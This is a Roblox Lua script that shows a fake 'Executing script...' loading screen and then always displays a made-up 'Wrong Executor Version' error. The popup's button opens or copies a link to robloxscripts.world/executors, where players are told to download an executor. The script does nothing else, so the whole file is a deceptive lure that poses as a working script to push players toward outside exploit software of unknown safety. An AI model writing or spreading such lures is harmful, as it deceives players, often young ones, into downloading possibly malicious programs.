pcall(function()
    -- Create the main GUI
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "HelloWorldPopup"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Parent = game:GetService("CoreGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    
    -- Create loading screen
    local LoadingGui = Instance.new("ScreenGui")
    LoadingGui.Name = "LoadingScreen"
    LoadingGui.ResetOnSpawn = false
    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    LoadingGui.Parent = game:GetService("CoreGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    
    -- Loading frame
    local LoadingFrame = Instance.new("Frame")
    LoadingFrame.Name = "LoadingFrame"
    LoadingFrame.Size = UDim2.new(0, 400, 0, 150)
    LoadingFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    LoadingFrame.BorderSizePixel = 0
    LoadingFrame.Parent = LoadingGui
    
    local LoadingCorner = Instance.new("UICorner")
    LoadingCorner.CornerRadius = UDim.new(0, 12)
    LoadingCorner.Parent = LoadingFrame
    
    local LoadingStroke = Instance.new("UIStroke")
    LoadingStroke.Color = Color3.fromRGB(60, 60, 60)
    LoadingStroke.Thickness = 2
    LoadingStroke.Parent = LoadingFrame
    
    -- Loading text
    local LoadingLabel = Instance.new("TextLabel")
    LoadingLabel.Name = "LoadingLabel"
    LoadingLabel.Size = UDim2.new(1, -40, 1, -40)
    LoadingLabel.Position = UDim2.new(0, 20, 0, 20)
    LoadingLabel.BackgroundTransparency = 1
    LoadingLabel.Text = "Executing script..."
    LoadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadingLabel.TextSize = 28
    LoadingLabel.Font = Enum.Font.GothamBold
    LoadingLabel.TextXAlignment = Enum.TextXAlignment.Center
    LoadingLabel.TextYAlignment = Enum.TextYAlignment.Center
    LoadingLabel.Parent = LoadingFrame
    
    -- Animated dots with slower update rate
    local dots = {"", ".", "..", "..."}
    local dotIndex = 1
    local stopAnimation = false
    
    -- Update text every 0.5 seconds instead of every frame
    spawn(function()
        while not stopAnimation do
            LoadingLabel.Text = "Executing script" .. dots[dotIndex]
            dotIndex = dotIndex + 1
            if dotIndex > #dots then
                dotIndex = 1
            end
            wait(0.5)
        end
    end)
    
    -- Wait 5 seconds
    wait(5)
    
    -- Stop animation and remove loading screen
    stopAnimation = true
    LoadingGui:Destroy()
    
    -- Create the main frame (popup background)
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 500, 0, 280)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -140) -- Center of screen
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    -- Add corner radius for modern look
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = MainFrame
    
    -- Add shadow effect
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(60, 60, 60)
    UIStroke.Thickness = 2
    UIStroke.Parent = MainFrame
    
    -- Create the title label
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Name = "TitleLabel"
    TitleLabel.Size = UDim2.new(1, -40, 0, 120)
    TitleLabel.Position = UDim2.new(0, 20, 0, 20)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = "Script Failed to execute. Error = Wrong Executor Version, Please go to https://robloxscripts.world/executors to download the correct one"
    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleLabel.TextSize = 18
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
    TitleLabel.TextYAlignment = Enum.TextYAlignment.Top
    TitleLabel.TextWrapped = true
    TitleLabel.Parent = MainFrame
    
    -- Create the button
    local RedirectButton = Instance.new("TextButton")
    RedirectButton.Name = "RedirectButton"
    RedirectButton.Size = UDim2.new(0, 460, 0, 60)
    RedirectButton.Position = UDim2.new(0.5, -230, 1, -80)
    RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    RedirectButton.Text = "Click here to redirect to Executors download page"
    RedirectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    RedirectButton.TextSize = 16
    RedirectButton.Font = Enum.Font.Gotham
    RedirectButton.TextWrapped = true
    RedirectButton.BorderSizePixel = 0
    RedirectButton.Active = true
    RedirectButton.Selectable = true
    RedirectButton.ZIndex = 10
    RedirectButton.Parent = MainFrame
    
    -- Add corner radius to button
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 8)
    ButtonCorner.Parent = RedirectButton
    
    -- Button hover effect
    RedirectButton.MouseEnter:Connect(function()
        RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
    end)
    
    RedirectButton.MouseLeave:Connect(function()
        RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    end)
    
    -- Function to handle button click
    local function openWebsite()
        local url = "https://robloxscripts.world/executors"
        
        -- Visual feedback
        RedirectButton.Text = "Opening..."
        wait(0.1)
        
        -- Method 1: OpenBrowserWindow (most common)
        local success1 = pcall(function()
            game:GetService("StarterGui"):SetCore("OpenBrowserWindow", url)
        end)
        
        if success1 then
            RedirectButton.Text = "Opened!"
            wait(1)
            RedirectButton.Text = "Click here to redirect to Executors download page"
            return
        end
        
        -- Method 2: Synapse X method
        local success2 = pcall(function()
            if syn and syn.open then
                syn.open(url)
                RedirectButton.Text = "Opened!"
                wait(1)
                RedirectButton.Text = "Click here to redirect to Executors download page"
                return
            end
        end)
        
        -- Method 3: Using HttpService (some executors)
        local success3 = pcall(function()
            game:GetService("HttpService"):GetAsync(url)
        end)
        
        -- Method 4: Copy to clipboard and notify
        pcall(function()
            if setclipboard then
                setclipboard(url)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Link Copied!",
                    Text = "The link has been copied to your clipboard. Paste it in your browser!",
                    Duration = 5
                })
                RedirectButton.Text = "Link Copied to Clipboard!"
                wait(2)
                RedirectButton.Text = "Click here to redirect to Executors download page"
            else
                RedirectButton.Text = "Please visit: " .. url
            end
        end)
    end
    
    -- Connect both MouseButton1Click and Activated for maximum compatibility
    RedirectButton.MouseButton1Click:Connect(openWebsite)
    RedirectButton.Activated:Connect(openWebsite)
    
    -- Optional: Add a close button
    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "CloseButton"
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -35, 0, 10)
    CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 18
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.BorderSizePixel = 0
    CloseButton.Parent = MainFrame
    
    local CloseButtonCorner = Instance.new("UICorner")
    CloseButtonCorner.CornerRadius = UDim.new(0, 6)
    CloseButtonCorner.Parent = CloseButton
    
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
end)
